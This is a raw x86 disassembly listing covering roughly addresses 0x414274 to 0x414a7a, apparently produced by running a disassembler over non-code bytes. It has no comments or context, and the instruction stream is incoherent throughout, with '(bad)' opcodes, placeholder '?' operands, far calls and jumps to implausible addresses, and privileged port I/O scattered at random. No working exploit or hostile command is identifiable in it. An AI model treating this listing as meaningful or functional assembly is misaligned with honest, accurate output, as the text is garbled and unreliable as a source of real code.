  414274:	imul   esp,DWORD PTR [edx-0x16],0xa
  414278:	or     eax,0x500a0064
  41427d:	pusha  
  41427e:	or     edi,DWORD PTR [edx]
  414280:	shl    BYTE PTR [eax+0x705d1530],cl
  414286:	(bad)  
  414287:	push   0x2326b456
  41428c:	mov    WORD PTR [edx],?
  41428e:	mov    esi,ss
  414290:	push   ds
  414291:	pop    esi
  414292:	cwde   
  414293:	fimul  DWORD PTR [ecx-0x6fc7e84a]
  414299:	pushf  
  41429a:	jmp    0x5014301
  41429f:	mov    dl,0x44
  4142a1:	bound  esp,QWORD PTR [eax+esi*8+0x77d0b680]
  4142a8:	in     al,dx
  4142a9:	jl     0x4142cf
  4142ab:	xchg   esi,eax
  4142ac:	lea    ebp,[eax]
  4142ae:	pop    esi
  4142af:	inc    ebx
  4142b0:	test   al,0xbc
  4142b2:	mov    ch,0xa8
  4142b4:	mov    ds:0xaaa1ee5e,al
  4142b9:	ror    DWORD PTR [ebp-0x22],0x9e
  4142bd:	xchg   BYTE PTR [edx],ch
  4142bf:	sub    DWORD PTR [edx+0x45],eax
  4142c2:	inc    ecx
  4142c3:	inc    eax
  4142c4:	test   dh,0x42
  4142c7:	add    DWORD PTR ds:0x5e287cad,ecx
  4142cd:	leave  
  4142ce:	mov    dh,0xf1
  4142d0:	pusha  
  4142d1:	push   ebx
  4142d2:	(bad)  [ecx+0x3418ee80]
  4142d8:	mov    BYTE PTR [esi+0x42],ah
  4142db:	sub    ah,BYTE PTR [ebx-0x105fc25f]
  4142e1:	fadd   st(7),st
  4142e3:	(bad)  
  4142e4:	and    cl,BYTE PTR [eax]
  4142e6:	cmc    
  4142e7:	and    al,0xb5
  4142e9:	sbb    eax,0xd6c57072
  4142ee:	cs retf 0xea6d
  4142f2:	retf   
  4142f3:	inc    eax
  4142f4:	fcmovnu st,st(2)
  4142f6:	pop    ecx
  4142f7:	add    bl,BYTE PTR [eax+0x51]
  4142fa:	fcmove st,st(2)
  4142fc:	xchg   BYTE PTR [ebp-0x2587555f],ch
  414302:	pop    edx
  414303:	adc    al,cl
  414305:	fwait
  414306:	jbe    0x41437c
  414308:	inc    eax
  414309:	sbb    dl,BYTE PTR [ebx]
  41430b:	inc    edx
  41430c:	push   0xbebea805
  414311:	adc    DWORD PTR [eax],esi
  414313:	inc    esi
  414314:	sbb    edi,DWORD PTR [edx]
  414316:	pop    edx
  414317:	push   edi
  414318:	cmp    BYTE PTR [esi+0x50],ch
  41431b:	mov    dl,0x8e
  41431d:	cld    
  41431e:	cmp    DWORD PTR [edi+eiz*1-0x754ae99f],0x66
  414326:	sub    BYTE PTR [esi-0x7f],bl
  414329:	mov    al,ds:0x68d18293
  41432e:	sub    ch,BYTE PTR [edx+edi*2+0x3d]
  414332:	mov    ah,0xd0
  414334:	fs (bad) 
  414336:	dec    esi
  414337:	and    DWORD PTR [ebx+esi*1],ebp
  41433a:	ja     0x4143ab
  41433c:	add    ebx,DWORD PTR [ebp-0x698c43ee]
  414342:	push   es
  414343:	daa    
  414344:	and    DWORD PTR [esi+0x4448dcd6],0x335be1a
  41434e:	test   DWORD PTR [ebx],edx
  414350:	add    ah,dl
  414352:	lods   al,BYTE PTR ds:[esi]
  414353:	lods   al,BYTE PTR ds:[esi]
  414354:	in     eax,dx
  414355:	adc    al,BYTE PTR [eax]
  414357:	call   0xc096:0x3507023b
  41435e:	jp     0x41438e
  414360:	stos   BYTE PTR es:[edi],al
  414361:	mov    es,WORD PTR [edx]
  414363:	imul   ebx,DWORD PTR [edx-0xc393bcb],0x12
  41436a:	inc    eax
  41436b:	jb     0x4142ef
  41436d:	xchg   BYTE PTR [esi],ah
  41436f:	push   eax
  414370:	mov    edx,0x6c576258
  414375:	xchg   esp,eax
  414376:	test   al,0x79
  414378:	ret    
  414379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437a:	sti    
  41437b:	(bad)  
  41437c:	jae    0x41437e
  41437e:	mov    ch,0xa5
  414380:	ins    DWORD PTR es:[edi],dx
  414381:	mov    dh,0x70
  414383:	cmp    DWORD PTR [edx*4-0x579f37c6],eax
  41438a:	cld    
  41438b:	push   esi
  41438c:	test   al,0x7e
  41438e:	adc    DWORD PTR [eax-0x23c33db3],ebp
  414394:	pop    edi
  414395:	or     cl,BYTE PTR [edx+0x4c1a8a6]
  41439b:	inc    esp
  41439c:	pop    ds
  41439d:	mov    al,0x98
  41439f:	ds hlt 
  4143a1:	xchg   ebx,eax
  4143a2:	pop    ecx
  4143a3:	add    BYTE PTR [esi-0x3520ebf4],0x62
  4143aa:	jmp    0xd117ca13
  4143af:	pop    edx
  4143b0:	aaa    
  4143b1:	jbe    0x41437d
  4143b3:	call   0xe687:0xbe060ef4
  4143ba:	push   esi
  4143bb:	hlt    
  4143bc:	mov    ah,BYTE PTR [edx-0x11547fff]
  4143c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c3:	dec    ebp
  4143c4:	add    BYTE PTR [edi-0x4e71f88c],ch
  4143ca:	lock or eax,edx
  4143cd:	loope  0x414405
  4143cf:	push   ss
  4143d0:	mov    eax,ds:0xb50628c2
  4143d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d6:	shl    BYTE PTR [eax+edi*1],0xd4
  4143da:	fidiv  DWORD PTR [eax+0x14848835]
  4143e0:	sbb    BYTE PTR [edx-0xd],bh
  4143e3:	cmp    bh,dh
  4143e5:	add    ebp,DWORD PTR [esi]
  4143e7:	or     al,0xbc
  4143e9:	adc    ah,BYTE PTR [eax]
  4143eb:	addr16 mov cl,0x6a
  4143ee:	out    dx,al
  4143ef:	and    al,0x1a
  4143f1:	or     bl,BYTE PTR [edx]
  4143f3:	cmp    BYTE PTR [edi-0x6a],cl
  4143f6:	(bad)  
  4143f8:	ret    
  4143f9:	mov    ch,0xc0
  4143fb:	mov    dh,0xa6
  4143fd:	cwde   
  4143fe:	sub    bh,BYTE PTR ds:0xfa38af94
  414404:	jb     0x414395
  414406:	pushf  
  414407:	and    DWORD PTR [ecx-0x7963b4f6],eax
  41440d:	push   ecx
  41440e:	in     al,dx
  41440f:	inc    eax
  414410:	xor    edi,DWORD PTR [ebx]
  414412:	fidivr DWORD PTR [eax]
  414414:	pop    esi
  414415:	push   ds
  414416:	ss jp  0x41439b
  414419:	cmp    cl,BYTE PTR [ebp+0x5e]
  41441c:	add    edi,DWORD PTR [ebx]
  41441e:	aam    0x1e
  414420:	shl    cl,cl
  414422:	push   ebp
  414423:	pusha  
  414424:	sbb    esi,DWORD PTR [ecx-0x13]
  414427:	clc    
  414428:	mov    ds:0x46b03e1a,al
  41442d:	push   es
  41442e:	stos   BYTE PTR es:[edi],al
  41442f:	(bad)
  414432:	push   ss
  414433:	sbb    al,0xab
  414435:	out    dx,al
  414436:	xchg   edx,eax
  414437:	fsubp  st(0),st
  414439:	scas   al,BYTE PTR es:[edi]
  41443a:	dec    eax
  41443b:	sub    DWORD PTR [eax],edx
  41443d:	jp     0x414467
  41443f:	std    
  414440:	out    0x92,al
  414442:	xor    al,0xca
  414444:	imul   esp,eax,0xffffffed
  414447:	xchg   ebp,eax
  414448:	test   ebp,ebp
  41444a:	outs   dx,BYTE PTR ds:[esi]
  41444b:	xchg   edx,eax
  41444c:	fs dec edx
  41444e:	sti    
  41444f:	dec    edx
  414450:	sub    DWORD PTR [ebx],0x3aea84ee
  414456:	inc    esi
  414457:	imul   eax,DWORD PTR [eax-0x2],0x34
  41445b:	add    DWORD PTR [eax-0x47],eax
  41445e:	xchg   ah,dl
  414460:	add    DWORD PTR [edi],ebp
  414462:	or     BYTE PTR [eax+ebp*4-0x6b252b8d],ch
  414469:	test   DWORD PTR [eax],edx
  41446b:	add    ebx,DWORD PTR [ebp-0x30]
  41446e:	jle    0x414430
  414470:	in     eax,0x74
  414472:	adc    al,0x5d
  414474:	test   al,0x6d
  414476:	pop    esp
  414477:	xchg   edx,ecx
  414479:	push   edx
  41447a:	ins    DWORD PTR es:[edi],dx
  41447b:	mov    ?,eax
  41447d:	outs   dx,BYTE PTR ds:[esi]
  41447e:	lods   eax,DWORD PTR ds:[esi]
  41447f:	ret    
  414480:	add    dl,BYTE PTR [esp+esi*2-0x46]
  414484:	mov    dh,0x9a
  414486:	jle    0x4144ce
  414488:	mov    eax,DWORD PTR [edi]
  41448a:	xchg   edx,eax
  41448b:	(bad)  
  41448c:	or     DWORD PTR [edx],0xb80e7c43
  414492:	xchg   ecx,eax
  414493:	cli    
  414494:	push   esp
  414495:	out    dx,al
  414496:	xor    eax,0x1a0d0519
  41449b:	lahf   
  41449c:	ins    BYTE PTR es:[edi],dx
  41449d:	sub    al,0xcc
  41449f:	clc    
  4144a0:	add    BYTE PTR [eax-0x5],al
  4144a3:	or     DWORD PTR [esi+0x522ef9ee],esi
  4144a9:	ror    BYTE PTR [eax-0x60],0xe8
  4144ad:	shl    BYTE PTR [esp+ecx*4],cl
  4144b0:	lea    ebx,[eax+0x41]
  4144b3:	imul   ebp,DWORD PTR [eax-0x53],0xffffff9c
  4144b7:	out    0x76,al
  4144b9:	retf   0x48e2
  4144bc:	outs   dx,BYTE PTR ds:[esi]
  4144bd:	fcmovbe st,st(6)
  4144bf:	inc    ebp
  4144c0:	scas   al,BYTE PTR es:[edi]
  4144c1:	call   0xf508:0x28574360
  4144c8:	clc    
  4144c9:	sbb    DWORD PTR [ebx],edx
  4144cb:	js     0x4144d1
  4144cd:	push   es
  4144ce:	(bad)  
  4144cf:	scas   al,BYTE PTR es:[edi]
  4144d0:	cs xor eax,0x3adf0292
  4144d6:	or     BYTE PTR [ecx-0x50],dh
  4144d9:	add    eax,0x2e3a0f05
  4144de:	data16 test BYTE PTR [edx+esi*2-0x49dfc5e9],0xf6
  4144e7:	jmp    0x401e:0xa864d7e
  4144ee:	imul   edx,DWORD PTR [eax+0x43],0xf41f6d83
  4144f5:	call   0x7544:0xa85f9be
  4144fc:	sbb    dl,ah
  4144fe:	sbb    ch,BYTE PTR [ebx+eax*2-0xe]
  414502:	xor    bh,BYTE PTR [esi+0x4b747c8c]
  414508:	xor    al,0xf0
  41450a:	add    BYTE PTR [edi+0x58],0x51
  41450e:	mov    WORD PTR [esp+ebx*8],es
  414511:	jmp    0xd6900b6d
  414516:	lea    ecx,[esi]
  414518:	push   ebx
  414519:	push   eax
  41451a:	call   0x42c96a10
  41451f:	jno    0x414509
  414521:	pop    es
  414522:	adc    bl,BYTE PTR [edx]
  414524:	ret    0x58bd
  414527:	add    bh,BYTE PTR [ecx-0x4d577e00]
  41452d:	(bad)  
  41452e:	mov    ch,0x6e
  414530:	jp     0x41459a
  414532:	stos   BYTE PTR es:[edi],al
  414533:	mov    edx,0x1e7c0c04
  414538:	sbb    al,0xac
  41453a:	test   al,0xa8
  41453c:	sub    BYTE PTR [edx-0x6c],dh
  41453f:	rcr    BYTE PTR [eax+0x34],0xaf
  414543:	push   edx
  414544:	cmp    al,0x63
  414546:	pusha  
  414547:	mov    dh,0x70
  414549:	add    DWORD PTR [eax],esi
  41454b:	and    dl,0x47
  41454e:	ror    ebp,cl
  414550:	(bad)  
  414551:	sub    al,0x6a
  414553:	sbb    al,0xd0
  414555:	bnd jns 0x414558
  414558:	mov    bl,0x76
  41455a:	sti    
  41455b:	adc    dl,BYTE PTR [ebx+0x47]
  41455e:	mov    ds:0x7fbe2c5a,eax
  414563:	mov    ch,BYTE PTR [ebx-0x6a]
  414566:	xor    bl,BYTE PTR [eax+0x48]
  414569:	pop    ecx
  41456a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41456b:	add    al,0x24
  41456d:	std    
  41456e:	mov    gs,WORD PTR [edx]
  414570:	shl    BYTE PTR [ebx],0x50
  414573:	sub    bl,BYTE PTR [esi-0x6289b5f8]
  414579:	inc    eax
  41457a:	fistp  DWORD PTR [edx]
  41457c:	pop    esp
  41457d:	repnz mov esp,0x8d973ad6
  414583:	or     dh,BYTE PTR [ebx+0x20]
  414586:	mov    al,0xea
  414588:	add    ecx,DWORD PTR [eax+edi*8]
  41458b:	shl    BYTE PTR [ebx-0x65],0xa0
  41458f:	or     DWORD PTR [eax],ebp
  414591:	clc    
  414592:	xchg   esp,eax
  414593:	sub    DWORD PTR [esi],esi
  414595:	pop    es
  414596:	xchg   esi,eax
  414597:	mov    ecx,0x48f6d4d7
  41459c:	lods   al,BYTE PTR ds:[esi]
  41459d:	sub    esp,DWORD PTR [eax-0x250f77f2]
  4145a3:	call   0xf4aefe90
  4145a8:	outs   dx,DWORD PTR ds:[esi]
  4145a9:	rol    DWORD PTR [eax-0x29],cl
  4145ac:	add    dl,ch
  4145ae:	pusha  
  4145af:	fwait
  4145b0:	lock mov ebp,0xaaf68ed9
  4145b6:	and    dh,BYTE PTR [ebp+0x184d108c]
  4145bc:	retf   
  4145bd:	adc    dl,bh
  4145bf:	cmp    BYTE PTR [edx],0x2a
  4145c2:	sub    eax,0x5b9c09dc
  4145c7:	sub    DWORD PTR [edi-0x13434756],0x13aec010
  4145d1:	int3   
  4145d2:	add    BYTE PTR [ebx+ecx*8-0x40],ah
  4145d6:	and    ah,BYTE PTR [ebx-0x33d1c3c2]
  4145dc:	mov    al,0xa4
  4145de:	ds inc ebx
  4145e0:	mov    al,0xc1
  4145e2:	ss das 
  4145e4:	jmp    0x4145be
  4145e6:	mov    BYTE PTR [esi-0x2f0936aa],dh
  4145ec:	push   0x6230ad45
  4145f1:	cmp    cl,BYTE PTR [ecx+0x50]
  4145f4:	sysenter 
  4145f6:	adc    al,0x5e
  4145f8:	sbb    DWORD PTR [ebx+0x19caf69a],ecx
  4145fe:	mov    al,0x81
  414600:	and    eax,0xd339c8bc
  414605:	cli    
  414606:	adc    dl,al
  414608:	fmul   QWORD PTR [eax-0x60]
  41460b:	loop   0x41464f
  41460d:	adc    al,BYTE PTR [ebx+0x5e80810]
  414613:	sbb    eax,0xa14ca096
  414618:	mov    ah,0xa
  41461a:	add    eax,0x686a90ba
  41461f:	push   0xc1e300cd
  414624:	mov    esi,0x27e1a78
  414629:	pop    ebp
  41462a:	leave  
  41462b:	inc    edx
  41462c:	adc    ebp,DWORD PTR [ebp-0x49087816]
  414632:	pop    esi
  414633:	aam    0xa
  414635:	sbb    ch,BYTE PTR [eax+ebp*4+0xbe67b36]
  41463c:	pop    eax
  41463d:	xor    bl,BYTE PTR [esi]
  41463f:	pop    edx
  414640:	cwde   
  414641:	mov    al,ds:0x723bf9aa
  414646:	dec    ebp
  414647:	xlat   BYTE PTR ds:[ebx]
  414648:	add    ch,bl
  41464a:	(bad)  
  41464c:	xor    bl,dl
  41464e:	push   es
  41464f:	loopne 0x414659
  414651:	mov    esi,0xccc661c3
  414656:	fadd   st,st(7)
  414658:	add    BYTE PTR ds:0x935eae4,ch
  41465e:	sub    al,BYTE PTR [esi+ebx*1]
  414661:	xor    eax,DWORD PTR [edx+ecx*8-0x5d919505]
  414668:	mov    al,ds:0xc1e3c8e
  41466d:	push   esp
  41466e:	call   0x6c439c0f
  414673:	jmp    0x2e1e:0x12164832
  41467a:	mov    dh,BYTE PTR [ebp+0x14]
  41467d:	sbb    DWORD PTR [esp+esi*1],eax
  414680:	mov    es,WORD PTR [eax-0x44]
  414683:	gs cmc 
  414685:	add    eax,0x82f616cd
  41468a:	push   0x16
  41468c:	jl     0x414702
  41468e:	test   BYTE PTR [edi-0x63],al
  414691:	add    BYTE PTR [eax-0x3bea2553],dl
  414697:	pop    ss
  414698:	cmp    dl,bl
  41469a:	mov    eax,0x2ea70075
  41469f:	jmp    0x4146b5
  4146a1:	stos   DWORD PTR es:[edi],eax
  4146a2:	test   BYTE PTR [eax],ah
  4146a4:	xor    al,BYTE PTR [esi+edi*4+0x57586a1a]
  4146ab:	jmp    0x414641
  4146ad:	inc    eax
  4146ae:	shr    eax,1
  4146b0:	call   0x42c43405
  4146b5:	push   ebx
  4146b6:	sbb    esi,DWORD PTR [esi]
  4146b8:	xchg   edx,eax
  4146b9:	jbe    0x41468d
  4146bb:	ret    0x91
  4146be:	outs   dx,BYTE PTR ds:[esi]
  4146bf:	test   al,0x68
  4146c1:	dec    edi
  4146c2:	(bad)  
  4146c3:	mov    ah,0xa6
  4146c5:	dec    edx
  4146c6:	mov    al,0x94
  4146c8:	xchg   BYTE PTR [eax],dl
  4146ca:	jno    0x414734
  4146cc:	xchg   esi,eax
  4146cd:	adc    BYTE PTR [edx],ch
  4146cf:	ins    BYTE PTR es:[edi],dx
  4146d0:	jle    0x41467c
  4146d2:	into   
  4146d3:	dec    DWORD PTR [ebp-0x4a]
  4146d6:	cmp    eax,0x9a610288
  4146db:	and    al,BYTE PTR [edx-0x72]
  4146de:	push   0x2f
  4146e0:	test   al,0x26
  4146e2:	or     BYTE PTR ds:0x512a3326,cl
  4146e8:	dec    ebp
  4146e9:	inc    ebp
  4146ea:	rol    DWORD PTR ds:0x6b92919c,1
  4146f0:	dec    esp
  4146f1:	or     BYTE PTR [ecx],ch
  4146f3:	aam    0x70
  4146f5:	test   BYTE PTR ds:0x3ccac912,bl
  4146fb:	outs   dx,DWORD PTR ds:[esi]
  4146fc:	and    BYTE PTR [ebx],cl
  4146fe:	adc    eax,0x88234207
  414703:	xchg   DWORD PTR [edx+0xbb67061],eax
  414709:	inc    ebp
  41470a:	dec    esi
  41470b:	add    ah,bl
  41470d:	outs   dx,BYTE PTR ds:[esi]
  41470e:	popf   
  41470f:	mov    bh,BYTE PTR [esi]
  414711:	inc    ecx
  414712:	je     0x414778
  414714:	inc    ecx
  414715:	push   eax
  414716:	dec    ecx
  414717:	cmp    BYTE PTR [ebx-0x75],bh
  41471a:	or     cl,BYTE PTR [ebx+edi*4]
  41471d:	aam    0x36
  41471f:	in     al,dx
  414720:	inc    esp
  414721:	sbb    BYTE PTR [edi+0x35949b62],ch
  414727:	jl     0x414772
  414729:	pop    ebp
  41472a:	xchg   edx,eax
  41472b:	lods   al,BYTE PTR ds:[esi]
  41472c:	into   
  41472d:	mov    al,0x38
  41472f:	daa    
  414730:	lods   al,BYTE PTR ds:[esi]
  414731:	push   0x53807418
  414736:	in     al,0xbc
  414738:	sub    eax,DWORD PTR [edx+0x2d15c343]
  41473e:	push   edx
  41473f:	push   esp
  414740:	push   edx
  414741:	inc    ebp
  414742:	inc    eax
  414743:	outs   dx,BYTE PTR ds:[esi]
  414744:	test   DWORD PTR [ebx-0x277cbc7a],esi
  41474a:	or     al,0x82
  41474c:	inc    eax
  41474d:	in     al,0xe2
  41474f:	sti    
  414750:	push   eax
  414751:	push   esp
  414752:	test   al,0x20
  414754:	cmp    al,0x24
  414756:	and    al,0x68
  414758:	call   0x25599e14
  41475d:	xor    al,0xf8
  41475f:	test   al,0x4
  414761:	loop   0x414758
  414763:	push   esp
  414764:	mov    bh,BYTE PTR [eax]
  414766:	xor    dl,al
  414768:	loop   0x414705
  41476a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476b:	pop    esp
  41476c:	scas   al,BYTE PTR es:[edi]
  41476d:	scas   eax,DWORD PTR es:[edi]
  41476e:	push   0x2374bc50
  414773:	push   0xa
  414775:	out    dx,al
  414776:	add    BYTE PTR [eax-0x25ff5bad],bh
  41477c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477d:	or     DWORD PTR [ecx+0x32],0x41b13418
  414784:	cmc    
  414785:	sub    BYTE PTR [eax-0x24],0x26
  414789:	cmp    al,0xeb
  41478b:	sub    dh,dh
  41478d:	int    0xb1
  41478f:	mov    al,ds:0x5244eca2
  414794:	shl    DWORD PTR [eax+0x4f],0xea
  414798:	int3   
  414799:	dec    esp
  41479a:	pop    es
  41479b:	mov    eax,0xc8187435
  4147a0:	jb     0x414782
  4147a2:	push   0x5e000ea6
  4147a7:	push   0x4e2d9543
  4147ac:	mov    ebx,0x95c00a48
  4147b1:	ds push edx
  4147b3:	shl    ch,1
  4147b5:	rol    al,0x4f
  4147b8:	sbb    dl,BYTE PTR [esp+ebp*4-0x2e]
  4147bc:	mov    ebp,0x2ad0d677
  4147c1:	ds dec esp
  4147c3:	int3   
  4147c4:	hlt    
  4147c5:	cmp    BYTE PTR [edx],cl
  4147c7:	je     0x4147cb
  4147c9:	sbb    DWORD PTR [eax+ebp*4],0xdbc2cbe0
  4147d0:	jecxz  0x414818
  4147d2:	call   0x1d569e3d
  4147d7:	mov    dh,0xa2
  4147d9:	jp     0x41480a
  4147db:	(bad)  
  4147dc:	outs   dx,BYTE PTR ds:[esi]
  4147dd:	lea    edi,[eax+0x3f28341e]
  4147e3:	dec    edi
  4147e4:	ins    BYTE PTR es:[edi],dx
  4147e5:	push   0x64bee84d
  4147ea:	pop    ebx
  4147eb:	adc    al,0xfd
  4147ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147ee:	(bad)  
  4147ef:	mov    ds:0x8dd80c89,al
  4147f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f5:	cmp    bh,BYTE PTR [esi]
  4147f7:	les    edi,FWORD PTR [ebp+0x55]
  4147fa:	(bad)  
  4147fc:	mov    esi,0x1cd410
  414801:	adc    BYTE PTR [ebx-0x22],dh
  414804:	xor    ecx,DWORD PTR [esi-0x80]
  414807:	push   edx
  414808:	or     DWORD PTR [eax-0x23c535eb],esi
  41480e:	rcr    BYTE PTR [esi-0x1264f2fd],1
  414814:	outs   dx,BYTE PTR ds:[esi]
  414815:	jmp    0x3e08:0x2a7c040b
  41481c:	(bad)  ds:0xc2b8191
  414822:	fwait
  414823:	aam    0x4b
  414825:	int    0xd
  414827:	mov    eax,0x6b16c830
  41482c:	add    BYTE PTR ds:0xf07052b8,al
  414832:	cld    
  414833:	retf   0x2c6d
  414836:	ret    0x4fb6
  414839:	or     cl,bl
  41483b:	jbe    0x414868
  41483d:	pushf  
  41483e:	fs loope 0x4147d9
  414841:	adc    dh,bl
  414843:	mov    WORD PTR [eax+eax*1-0x3a],fs
  414847:	aaa    
  414848:	adc    al,bh
  41484a:	ret    0xd127
  41484d:	or     ah,dl
  41484f:	inc    ecx
  414850:	lods   al,BYTE PTR ds:[esi]
  414851:	add    dh,BYTE PTR [ebp+0x25]
  414854:	mov    al,ds:0xfefafe11
  414859:	mov    esp,0xd0ba064f
  41485e:	outs   dx,BYTE PTR ds:[esi]
  41485f:	pop    ss
  414860:	and    al,0x38
  414862:	inc    DWORD PTR fs:[ebp-0xd]
  414866:	push   edi
  414867:	ins    DWORD PTR es:[edi],dx
  414868:	or     dh,BYTE PTR [edx]
  41486a:	shr    edx,cl
  41486c:	jmp    0xebd871
  414871:	xchg   edx,eax
  414872:	cmp    dl,BYTE PTR ds:0x89ed
  414877:	les    ebp,FWORD PTR [esi]
  414879:	mov    esp,0xf3544629
  41487e:	mov    dl,0x30
  414880:	or     eax,0x61aa0362
  414885:	fmulp  st(4),st
  414887:	mov    al,0x9a
  414889:	jo     0x41489f
  41488b:	push   ecx
  41488c:	push   0xf3082828
  414891:	dec    eax
  414892:	inc    ebp
  414893:	push   ebx
  414894:	sub    DWORD PTR [ebp+0x6a9f4f22],0x56
  41489b:	mov    ebp,DWORD PTR [eax]
  41489d:	icebp  
  41489e:	inc    esi
  41489f:	dec    ebx
  4148a0:	or     edi,DWORD PTR [ebx]
  4148a2:	pop    edx
  4148a3:	aam    0x28
  4148a5:	sub    al,dh
  4148a7:	or     ecx,esi
  4148a9:	cli    
  4148aa:	push   0x54da144f
  4148af:	mov    ebx,0x6d7c3d5e
  4148b4:	pop    eax
  4148b5:	or     edx,edi
  4148b7:	gs je  0x4148c2
  4148ba:	repnz add esi,ebp
  4148bd:	inc    ebx
  4148be:	jp     0x414846
  4148c0:	lock sub DWORD PTR [edx],0x6e
  4148c4:	dec    eax
  4148c5:	enter  0xf00b,0x6d
  4148c9:	push   ebp
  4148ca:	jmp    0x414944
  4148cc:	mov    al,ds:0x3a9590b1
  4148d1:	shr    BYTE PTR [eax+0x27046d7e],1
  4148d7:	adc    al,0x1c
  4148d9:	sbb    BYTE PTR ds:0xb2e0916e,cl
  4148df:	dec    esi
  4148e0:	pop    esi
  4148e1:	mov    BYTE PTR ds:0x5cee2198,ch
  4148e7:	inc    ebp
  4148e8:	adc    eax,0x9ce228c1
  4148ed:	out    dx,al
  4148ee:	mov    cs,WORD PTR [esi]
  4148f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f1:	jno    0x414925
  4148f3:	inc    ebx
  4148f4:	loop   0x414920
  4148f6:	ja     0x4148be
  4148f8:	jae    0x4148bd
  4148fa:	mov    ch,BYTE PTR [esi-0x59db315e]
  414900:	int    0x7a
  414902:	push   0x57240086
  414907:	ret    0x6203
  41490a:	fnsave [eax+eiz*2-0x1e3b71fb]
  414911:	sbb    ch,BYTE PTR [esi-0x2d45aa53]
  414917:	(bad)  
  414918:	(bad)  
  414919:	in     eax,0x50
  41491b:	xor    bl,BYTE PTR [eax]
  41491d:	jle    0x41493a
  41491f:	mov    ebx,0x803f87bc
  414924:	mov    fs:0x4d6d8302,eax
  41492a:	or     al,0x26
  41492c:	mov    esi,0xbc7ccaa5
  414931:	pop    esi
  414932:	inc    esp
  414933:	inc    ebp
  414934:	mov    dh,0xb9
  414936:	push   0x23
  414938:	popa   
  414939:	mov    ds:0x2c3500e1,al
  41493e:	push   ds
  41493f:	inc    esi
  414940:	mov    esp,0x6d05f602
  414945:	xchg   BYTE PTR [esi-0x362c51a],bh
  41494b:	mov    ds:0x1a14828e,al
  414950:	add    BYTE PTR [esi+ebx*8-0x60190942],dh
  414957:	or     al,0x2d
  414959:	mov    al,0xd7
  41495b:	pop    esi
  41495c:	add    esi,DWORD PTR [ecx-0x413dff54]
  414962:	xchg   DWORD PTR [edx+edi*4],edx
  414965:	jno    0x4149b9
  414967:	rcl    BYTE PTR [esi],1
  414969:	adc    BYTE PTR [bx],ch
  41496c:	fadd   DWORD PTR [edx+0x78ac0875]
  414972:	cs sub ebp,DWORD PTR fs:[ecx+edx*4-0x3e]
  414978:	outs   dx,BYTE PTR ds:[esi]
  414979:	adc    DWORD PTR [ebx],esi
  41497b:	lods   al,BYTE PTR ds:[esi]
  41497c:	pop    eax
  41497d:	sbb    BYTE PTR [esp+edi*2+0x5b06d30a],dh
  414984:	mov    WORD PTR [esi-0x37],ds
  414987:	cs push cs
  414989:	mov    edx,0x6cbe3a2a
  41498e:	jp     0x4149e6
  414990:	ret    
  414991:	ret    
  414992:	or     dh,0x93
  414995:	sub    al,0x3
  414997:	dec    esp
  414998:	adc    cl,cl
  41499a:	mov    ebx,DWORD PTR [edi+ebp*4+0x8]
  41499e:	cmp    BYTE PTR fs:[ebx-0x5629cdd4],al
  4149a5:	inc    edx
  4149a6:	fcmovnbe st,st(1)
  4149a8:	or     al,0x98
  4149aa:	call   0xce10:0x548090ee
  4149b1:	mov    BYTE PTR [ebp+0xd],dl
  4149b4:	inc    edi
  4149b5:	mov    ah,ch
  4149b7:	sahf   
  4149b8:	test   dh,bl
  4149ba:	pop    ebx
  4149bb:	scas   eax,DWORD PTR es:[edi]
  4149bc:	popa   
  4149bd:	sub    ch,BYTE PTR ss:[esi-0x51e30834]
  4149c4:	inc    esi
  4149c5:	adc    BYTE PTR [esi-0x2f],0xd0
  4149c9:	sbb    BYTE PTR [esi+0x54b8600e],cl
  4149cf:	push   ss
  4149d0:	sub    eax,0xa282800c
  4149d5:	scas   al,BYTE PTR es:[edi]
  4149d6:	popa   
  4149d7:	xchg   BYTE PTR [esi+eiz*1+0x5495de40],bl
  4149de:	xor    eax,0xf21a0835
  4149e3:	sbb    eax,0x42ae35b8
  4149e8:	or     eax,0xce3b615d
  4149ed:	xor    dh,0xa6
  4149f0:	cli    
  4149f1:	dec    ebx
  4149f2:	adc    DWORD PTR [ebx],0xe
  4149f5:	inc    eax
  4149f6:	inc    esp
  4149f7:	ret    0xc856
  4149fa:	sub    DWORD PTR [edx+0x36c06015],esp
  414a00:	dec    esp
  414a01:	pop    es
  414a02:	and    bh,al
  414a04:	push   esi
  414a05:	cmp    BYTE PTR ds:0x636be67b,cl
  414a0b:	cs mov ah,0x10
  414a0e:	lods   eax,DWORD PTR ds:[esi]
  414a0f:	xchg   DWORD PTR ds:0x160687b5,esi
  414a15:	mov    ch,0xe0
  414a17:	push   ss
  414a18:	jmp    0x414a42
  414a1a:	stc    
  414a1b:	add    DWORD PTR ds:0x7c9485,ebx
  414a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a22:	js     0x4149c2
  414a24:	pop    edx
  414a25:	mov    ds:0x37026384,eax
  414a2a:	mov    esi,0xeea58d3
  414a2f:	add    ebx,DWORD PTR [edi]
  414a31:	adc    al,0xa8
  414a33:	ret    0x6a96
  414a36:	mov    dh,0x9e
  414a38:	mov    eax,es
  414a3a:	pushf  
  414a3b:	fisttp WORD PTR [esi+0x4e]
  414a3e:	jle    0x414a53
  414a40:	fsub   DWORD PTR [eax+0x1c]
  414a43:	je     0x414a2a
  414a45:	cwde   
  414a46:	add    al,0x56
  414a48:	fisttp WORD PTR [edx-0x4d355c53]
  414a4e:	ret    0x9631
  414a51:	mov    al,0xd6
  414a53:	mov    esp,edx
  414a55:	les    esp,FWORD PTR [ecx-0x20]
  414a58:	add    BYTE PTR [ebp-0xe],bl
  414a5b:	retf   
  414a5c:	cs int3 
  414a5e:	pop    ebx
  414a5f:	add    bl,bl
  414a61:	lock test al,0x8f
  414a64:	xchg   edx,eax
  414a65:	in     al,0xd9
  414a67:	xor    al,0x4
  414a69:	or     eax,0x40c3d676
  414a6e:	shr    DWORD PTR [edx],cl
  414a70:	fidiv  WORD PTR [ebp-0xc]
  414a73:	call   0xdeed:0x8760098c
  414a7a:	sbb    bl,ah
